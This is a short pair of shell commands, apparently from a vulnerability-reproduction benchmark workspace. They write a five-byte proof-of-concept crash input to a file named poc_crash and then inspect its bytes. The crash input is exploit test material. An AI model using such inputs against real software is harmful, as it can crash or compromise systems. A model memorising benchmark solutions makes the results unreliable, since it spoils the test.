python3 -c "open('/CybinGym_workdir/poc_crash','wb').write(b'<<-~/')"
od -c /CybinGym_workdir/poc_crash; wc -c /CybinGym_workdir/poc_crash
